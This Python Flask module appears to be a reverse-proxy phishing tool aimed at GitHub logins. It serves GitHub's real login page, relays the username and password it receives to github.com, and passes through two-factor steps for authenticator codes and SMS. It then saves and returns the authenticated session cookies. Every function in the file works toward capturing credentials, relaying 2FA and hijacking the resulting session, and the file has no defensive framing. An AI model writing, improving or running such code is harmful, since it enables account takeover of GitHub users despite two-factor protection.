import requests
from bs4 import BeautifulSoup
import uuid
from flask import session as flask_session  # Flask session

# Rename the requests session to avoid conflict with flask_session
user_sessions = {}


def get_user_session():
    user_id = flask_session.get("user_id")
    if not user_id:
        user_id = str(uuid.uuid4())
        flask_session["user_id"] = user_id

    if user_id not in user_sessions:
        user_sessions[user_id] = requests.Session()
        user_sessions[user_id].headers.update(
            {"User-Agent": "Mozilla/5.0", "Accept-Language": "en-US,en;q=0.5"}
        )
    return user_sessions[user_id]


def save_cookies_to_session():
    """Save cookies from user session to Flask session."""
    session = get_user_session()
    flask_session["cookies"] = {cookie.name: cookie.value for cookie in session.cookies}


def load_cookies_from_session():
    """Load cookies from Flask session into the user's requests session."""
    session = get_user_session()

    if "cookies" in flask_session:
        for name, value in flask_session["cookies"].items():
            session.cookies.set(name, value)


def get_login_page():
    req_session = get_user_session()
    response = req_session.get("https://github.com/login")
    html = response.text

    # Use the HTML text from the response instead of the response object
    soup = BeautifulSoup(html, "html.parser")
    token_input = soup.find("input", {"name": "authenticity_token"})

    # Save the token value in Flask's session (assuming we're inside a Flask context)
    if token_input and token_input.has_attr("value"):
        flask_session["authenticity_token"] = token_input["value"]

    # Modify form action if necessary
    form = soup.find("form")
    if form and form.get("action") == "/session":
        form["action"] = "/session"

    return str(soup)


def perform_login(username, password):
    req_session = get_user_session()
    # Retrieve authenticity token
    token = flask_session.get("authenticity_token")
    if not token:
        return "Missing authenticity token.", "error", {}

    # Generate a device ID
    flask_session["device_id"] = str(uuid.uuid4())

    payload = {
        "authenticity_token": token,
        "login": username,
        "password": password,
        "webauthn-support": "supported",
        "webauthn-iuvpaa-support": "unsupported",
        "return_to": "",
        "allow_signup": "",
        "device_id": flask_session.get("device_id"),
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://github.com/login",
        "Origin": "https://github.com",
    }

    post_resp = req_session.post(
        "https://github.com/session",
        data=payload,
        headers=headers,
        allow_redirects=True,
    )
    html = post_resp.text

    save_cookies_to_session()

    cookies = req_session.cookies.get_dict()

    # Check for GitHub login failure indicators
    if "Incorrect username or password" in html:

        return html, "invalid", cookies

    if "There have been several failed login attempts" in html:

        return html, "rate_limited", cookies

    # Check if logged_in cookie is 'yes'
    if cookies.get("logged_in") == "yes":

        return html, "success", cookies

    # Check if we're being redirected to the 2FA page
    if "/sessions/two-factor" in post_resp.url or "two-factor" in html:

        return html, "2fa", cookies

    return html, "unknown", cookies


def perform_2fa():
    """
    Handles the 2FA submission using the code provided by the user.
    It requests the 2FA app page after login to fetch the form or QR code page.
    """
    req_session = get_user_session()
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": "https://github.com/sessions/two-factor",
        "Origin": "https://github.com",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.5",
    }

    response = req_session.get(
        "https://github.com/sessions/two-factor/app", headers=headers
    )

    save_cookies_to_session()

    # Parse the response to update the authenticity_token if needed
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "authenticity_token"})
    if token_input and token_input.has_attr("value"):
        flask_session["authenticity_token"] = token_input["value"]

    return response.text


def forward_sms():
    req_session = get_user_session()
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Accept": "text/html,application/xhtml+xml,application/json",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3",
        "Referer": "https://github.com/sessions/two-factor/webauthn",
        "Origin": "https://github.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Turbo-Visit": "true",
        "X-React-App-Name": "rails",
    }

    response = req_session.get(
        "https://github.com/sessions/two-factor/sms/confirm", headers=headers
    )
    save_cookies_to_session()

    # Check if we got a proper HTML response or if it's a redirect or error page
    if response.status_code != 200:
        return f"Error: {response.status_code}"

    # Parse the response to update the authenticity_token if needed
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "authenticity_token"})
    if token_input and token_input.has_attr("value"):
        flask_session["authenticity_token"] = token_input["value"]

    return response.text


def execute_2fa_otp(app_otp: int, field_name: str = None):
    # Step 1: Force correct 2FA page (Google Authenticator)
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": "https://github.com/sessions/two-factor",
        "Origin": "https://github.com",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.5",
    }

    req_session = get_user_session()
    resp = req_session.get(
        "https://github.com/sessions/two-factor/app", headers=headers
    )
    if resp.status_code != 200:
        return resp.text, "error", {}

    soup = BeautifulSoup(resp.text, "html.parser")

    token_input = soup.find("input", {"name": "authenticity_token"})
    if not token_input or not token_input.has_attr("value"):
        return resp.text, "error", {}

    token = token_input["value"]
    flask_session["authenticity_token"] = token

    # Auto-detect the OTP field if not given
    if not field_name:
        otp_input = soup.find(
            "input", {"type": "text", "autocomplete": "one-time-code"}
        )
        field_name = (
            otp_input["name"] if otp_input and otp_input.has_attr("name") else "otp"
        )

    payload = {
        "authenticity_token": token,
        field_name: app_otp,
        "webauthn-support": "supported",
        "webauthn-iuvpaa-support": "unsupported",
        "return_to": "",
        "allow_signup": "",
        "device_id": flask_session.get("device_id"),
    }

    headers["Content-Type"] = "application/x-www-form-urlencoded"

    post_resp = req_session.post(
        "https://github.com/sessions/two-factor", data=payload, headers=headers
    )

    soup = BeautifulSoup(post_resp.text, "html.parser")
    title = soup.title.string.strip() if soup.title else "Unknown"

    if "GitHub" in title and "two-factor" not in post_resp.url:
        return post_resp.text, "success", req_session.cookies.get_dict()
    elif "Two-factor authentication · GitHub" in title:
        return post_resp.text, "failure", req_session.cookies.get_dict()
    else:
        return post_resp.text, "unknown", req_session.cookies.get_dict()


def send_sms(authenticity_token, resend):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Accept": "text/html,application/xhtml+xml,application/json",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "https://github.com/sessions/two-factor/sms/confirm",
        "Origin": "https://github.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }

    payload = {
        "authenticity_token": authenticity_token,
        "resend": resend,
    }
    req_session = get_user_session()

    response = req_session.post(
        "https://github.com/sessions/two-factor/sms/confirm",
        headers=headers,
        data=payload,
    )
    save_cookies_to_session()

    if response.status_code != 200:
        return f"Error: {response.status_code}"

    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "authenticity_token"})
    if token_input and token_input.has_attr("value"):
        flask_session["authenticity_token"] = token_input["value"]

    return response.text
